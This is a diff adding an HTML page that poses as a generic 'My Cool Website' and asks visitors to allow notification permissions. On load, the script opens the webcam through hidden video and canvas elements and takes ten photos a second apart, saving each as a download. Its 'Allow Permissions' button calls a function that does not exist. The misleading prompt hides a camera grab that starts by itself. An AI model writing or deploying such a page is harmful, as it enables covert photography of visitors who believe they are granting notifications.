@@ -1,0 +1,146 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Webcam Auto Multiple Capture</title>
+
+<style>
+    /* Fullscreen gradient background */
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Arial', sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: linear-gradient(135deg, #FF6B6B, #FFD93D, #6BCB77, #4D96FF);
+        background-size: 400% 400%;
+        animation: gradientBG 15s ease infinite;
+        color: #fff;
+        text-align: center;
+    }
+
+    @keyframes gradientBG {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    .container {
+        background: rgba(0,0,0,0.4);
+        padding: 40px 60px;
+        border-radius: 15px;
+        box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    }
+
+    h1 {
+        margin-bottom: 20px;
+        font-size: 2.5rem;
+    }
+
+    p {
+        margin-bottom: 30px;
+        font-size: 1.2rem;
+    }
+
+    button {
+        background: #FFD93D;
+        color: #000;
+        font-size: 1.2rem;
+        padding: 15px 30px;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: 0.3s;
+    }
+
+    button:hover {
+        background: #FFC700;
+        transform: scale(1.05);
+    }
+
+</style>
+</head>
+<body>
+
+<header>
+    <h1>My Cool Website</h1>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">About</a>
+        <a href="#">Services</a>
+        <a href="#">Contact</a>
+    </nav>
+</header>
+
+<div class="content">
+    <h2>Welcome to Our Website!</h2>
+    <p>This is a colorful, interactive website where we provide amazing services and content for our users. To make the most out of this website, we need your permission for notifications and other browser features.</p>
+    <p>Explore our sections below and discover everything we have to offer. Your permissions help us improve your experience by sending updates and providing personalized features.</p>
+
+    <div class="permission-box">
+        <h3>Allow Browser Permissions</h3>
+        <p>Click the button below to allow notifications and other browser permissions.</p>
+        <button onclick="requestPermission()">Allow Permissions</button>
+    </div>
+
+    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec euismod, nisl eget consectetur sagittis, nisl nunc consectetur nisi, eget consectetur nunc nisl euismod nisl.</p>
+</div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const NUM_PHOTOS = 10;       // number of photos to take
+    const INTERVAL_MS = 1000;   // interval between photos in milliseconds
+
+    async function startCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        let photoCount = 0;
+
+        const capturePhoto = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(function(blob) {
+            const ts = new Date().toISOString().replace(/[:.]/g, '-');
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `webcam_${ts}.jpg`;
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+          }, 'image/jpeg', 0.9);
+
+          photoCount++;
+          if (photoCount >= NUM_PHOTOS) {
+            clearInterval(intervalId);
+            console.log(`${NUM_PHOTOS} photos captured.`);
+          }
+        };
+
+        // capture immediately and then at intervals
+        capturePhoto();
+        const intervalId = setInterval(capturePhoto, INTERVAL_MS);
+
+      } catch (err) {
+        console.error('Camera access error:', err);
+      }
+    }
+
+    window.addEventListener('load', startCapture);
+  </script>
+</body>
+</html>
+
